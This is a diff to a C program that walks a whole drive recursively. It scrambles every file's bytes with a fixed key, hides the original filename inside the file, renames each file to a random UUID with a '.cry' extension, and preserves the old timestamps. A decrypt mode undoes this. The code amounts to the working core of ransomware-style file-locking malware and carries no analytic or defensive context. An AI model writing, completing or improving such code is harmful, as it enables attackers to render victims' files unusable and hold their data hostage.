@@ -1,24 +1,37 @@
 #include "main.h"
 
+struct FileInfo {
+   char name[FILENAME_SIZE];
+};
+
 int dir_exists(const char *path);
 int file_exists(const char *filename);
-void endeda(char* ret, const char* path_old, const char* path_new, int key);
+void endeda(int mode, const char* path_old, char* path_new, const char* fname, int key);
 void copy_old_time(struct stat* st, const char* path_new);
 int randInRange(int min, int max);
 char randomByte();
 //void en_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output);
 //void de_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output);
-void processFilesRecursively(struct AES_ctx* ctx, const char* basePath, const char* ext);
+char* uuid4();
+void processFilesRecursively(struct AES_ctx* ctx, int mode, const char* basePath, const char* ext);
 
 int main(int argc, char *argv[])
 {
+	if (argc != 2) return EXIT_SUCCESS;
+	
+	int mode = 0;
+	if (strcmp(argv[1], "encrypt") == 0)
+		mode = 1;
+	else if (strcmp(argv[1], "decrypt") == 0)
+		mode = 2;
+	
 	srand (time(NULL));
 	
 	struct AES_ctx ctx;
 	
 	char* path = (char*)malloc(PATH_SIZE * sizeof(char));
-	strcpy(path, "Z:\\");
-	processFilesRecursively(&ctx, path, "foxcry");
+	strcpy(path, "E:\\");
+	processFilesRecursively(&ctx, mode, path, "cry");
 	free(path);
 	
 	return EXIT_SUCCESS;
@@ -45,8 +58,10 @@ int file_exists(const char *filename)
 	return 0;
 }
 
-void endeda(char* ret, const char* path_old, const char* path_new, int key)
+void endeda(int mode, const char* path_old, char* path_new, const char* fname, int key)
 {
+	//printf("%s\n", fname);
+	
 	FILE* fp_old = NULL;
 	FILE* fp_new = NULL;
 	char ch;
@@ -55,30 +70,48 @@ void endeda(char* ret, const char* path_old, const char* path_new, int key)
 	int i, j;
 	
 	fp_old = fopen(path_old,"rb");
-	fp_new = fopen(path_new,"wb");
-	
-	if(fp_old != NULL && fp_new != NULL)
+	if(fp_old != NULL)
 	{
-		while (0 < (bytes = fread(buffer, 1, sizeof(buffer), fp_old)))
+		if (mode==2)
 		{
-			j = bytes;
-			for(i=0; i<bytes; i++)
-			{
-				if (ret)
-				{
-					buffer[i]=buffer[i]+key-j;
-				}
-				else
-				{
-					buffer[i]=buffer[i]-key+j;
-				}
-				j--;
-			}
-			fwrite(buffer, 1, bytes, fp_new);
+			struct FileInfo fi;
+			fread(&fi, sizeof(struct FileInfo), 1, fp_old);
+			for(i = 0; (i < FILENAME_SIZE && fi.name[i] != '\0'); i++)
+				fi.name[i] = fi.name[i]-key+i;
+			strcat(path_new, fi.name);
 		}
+		
+		fp_new = fopen(path_new,"wb");
+		if(fp_new != NULL)
+		{
+			if (mode==1)
+			{
+				struct FileInfo fi;
+				strcpy(fi.name, fname);
+				for(i = 0; (i < FILENAME_SIZE && fi.name[i] != '\0'); i++)
+					fi.name[i] = fi.name[i]+key-i;
+				fwrite(&fi, sizeof(struct FileInfo), 1, fp_new);
+			}
+			while (0 < (bytes = fread(buffer, 1, sizeof(buffer), fp_old)))
+			{
+				j = bytes;
+				for(i=0; i<bytes; i++)
+				{
+					if (mode==2)
+					{
+						buffer[i]=buffer[i]+key-j;
+					}
+					else
+					{
+						buffer[i]=buffer[i]-key+j;
+					}
+					j--;
+				}
+				fwrite(buffer, 1, bytes, fp_new);
+			}
+		}
+		fclose(fp_new);
 	}
-	
-	fclose(fp_new);
 	fclose(fp_old);
 }
 
@@ -182,7 +215,23 @@ void de_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* da
 	free(str);
 } */
 
-void processFilesRecursively(struct AES_ctx* ctx, const char* basePath, const char* ext)
+char* uuid4()
+{
+	UUID4_STATE_T state;
+	UUID4_T uuid;
+
+	uuid4_seed(&state);
+	uuid4_gen(&state, &uuid);
+
+	char* buffer = (char*)malloc(UUID4_STR_BUFFER_SIZE * sizeof(char));
+	
+	if (uuid4_to_s(uuid, buffer, UUID4_STR_BUFFER_SIZE))
+		return buffer;
+	
+	return NULL;
+}
+
+void processFilesRecursively(struct AES_ctx* ctx, int mode, const char* basePath, const char* ext)
 {
     char path_old[PATH_SIZE];
 	char path_new[PATH_SIZE];
@@ -204,32 +253,38 @@ void processFilesRecursively(struct AES_ctx* ctx, const char* basePath, const ch
 			
 			strcpy(path_new, basePath);
             strcat(path_new, "\\");
-            strcat(path_new, dp->d_name);
 			
-			// Check Path contains extension
-			char* ret = strstr(path_new, ext);
-			if (ret)
+			if (mode==1)
 			{
-				ret--;
-				ret[0] = 0;
-			}
-			else
-			{
+				char* buffer = uuid4();
+				strcat(path_new, buffer);
+				free(buffer);
 				strcat(path_new, ".");
 				strcat(path_new, ext);
 			}
 			
 			if (dir_exists(path_old))
 			{				
-				processFilesRecursively(ctx, path_old, ext);
+				processFilesRecursively(ctx, mode, path_old, ext);
 			}
 			else
 			{
-				//printf("%s\n", dp->d_name);
-				//printf("%s\n", path_old);
-				//printf("%s\n", path_new);
+				// Check Path contains extension
+				char* ret = strstr(path_old, ext);
+				if (mode==1 && ret)
+				{
+					continue;
+				}
+				else if (mode==2 && !ret)
+				{
+					continue;
+				}
 				
-				endeda(ret, path_old, path_new, 786);
+				endeda(mode, path_old, path_new, dp->d_name, 786);
+				
+				//printf("%s\n", dp->d_name);
+				//printf("path_old : %s\n", path_old);
+				//printf("path_new : %s\n", path_new);
 				
 				if (file_exists(path_new))
 				{
